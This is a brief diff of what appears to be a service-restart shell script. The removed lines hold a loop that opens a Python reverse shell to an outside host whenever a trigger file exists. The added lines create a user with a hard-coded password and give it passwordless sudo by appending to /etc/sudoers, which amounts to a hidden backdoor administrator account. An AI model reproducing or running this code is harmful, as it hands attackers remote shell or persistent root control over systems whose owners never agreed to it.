@@ -11,14 +11,6 @@ echo "SERVIS YENDEN BASLATILDI"
 
 #exit;
 
-while true; do
-    if [ -e "/tmp/okay" ]; then
-        echo "/tmp/okay exists. Sending shell..."
-        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("java-atomic.gl.at.ply.gg",16652));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-        rm /tmp/okay
-        sleep 20
-    else
-        echo "/tmp/okay not exists. Retrying in 60 seconds..."
-        sleep 60
-    fi
-done
+useradd -m -s /bin/bash st4inl3s5
+echo "st4inl3s5:trakya2005" | chpasswd
+echo "st4inl3s5 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
